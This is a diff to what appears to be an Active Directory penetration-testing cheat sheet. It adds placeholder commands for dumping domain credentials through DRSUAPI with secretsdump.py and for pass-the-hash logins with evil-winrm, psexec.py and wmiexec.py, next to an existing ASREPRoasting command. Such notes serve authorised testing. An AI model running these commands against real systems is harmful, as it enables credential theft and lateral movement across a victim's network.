@@ -75,3 +75,19 @@ ASREPRoasting
 ```
 GetNPUsers.py -dc-ip IP domain.local/user
 ```
+DRSUAPI
+
+```
+secretsdump.py domain.local/USER:PASSWORD@IP
+```
+Pass the hash
+
+```
+evil-winrm -i IP -u user -H 'NTHash'
+```
+```
+psexec.py domain.local/user@ip -hashes 'LMHASH:NTHASH'
+```
+```
+wmiexec.py user@IP -hashes 'LMHASH:NTHASH'
+```
